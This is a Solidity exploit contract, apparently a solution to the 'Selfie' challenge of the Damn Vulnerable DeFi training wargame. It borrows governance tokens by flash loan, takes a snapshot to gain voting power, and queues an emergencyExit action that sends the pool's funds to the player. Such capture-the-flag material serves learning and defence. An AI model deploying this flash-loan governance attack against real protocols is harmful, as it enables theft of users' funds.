// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    ISimpleGovernance public governance;
    address public player;

    constructor(
        address _pool,
        address _governance,
        address _player,
        address _token
    ) {
        pool = SelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        player = _player;
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack(uint256 amount) external {
        token.approve(address(pool), amount);
        pool.flashLoan(this, address(token), amount, "");
    }

    function onFlashLoan(
        address,
        address _token,
        uint256,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        DamnValuableTokenSnapshot(_token).snapshot();
        governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
